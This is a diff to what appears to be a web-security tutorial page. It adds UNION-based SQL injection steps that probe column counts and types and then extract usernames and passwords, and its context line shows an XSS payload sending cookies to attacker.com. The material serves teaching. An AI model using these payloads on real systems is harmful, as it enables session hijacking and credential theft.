@@ -465,8 +465,17 @@ fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie)
                             <li><code>' UNION  SELECT NULL --</code> *Page breaks* </li>
                             <li><code>' UNION  SELECT NULL,NULL --</code> *Page breaks* </li>
                             <li><code>' UNION  SELECT NULL,NULL,NULL --</code> *Page works! We know its 3 columns* </li>
+                            <li><code>' ORDER BY 1--</code> *etc... you get the idea* </li>
                         </ul>
-                        
+                        <li>Step 2: Identify Nessary Data Types</li>
+                        <ul class="indented-list">
+                            <li><code>' UNION SELECT 'x',NULL,NULL--</code>*we probe the page for the correct data type*</li>
+                            <li><code>' UNION SELECT NULL,123,NULL--</code>*etc.... try a bunch of data types*</li>
+                        </ul>
+                        <li>Step 3: Extraction</li>
+                        <ul class="indented-list">
+                            <li><code>' UNION SELECT username,password FROM users--</code> *your crafted message*</li>
+                        </ul>
                     </ul>
                 </div>
                 <div class="card">
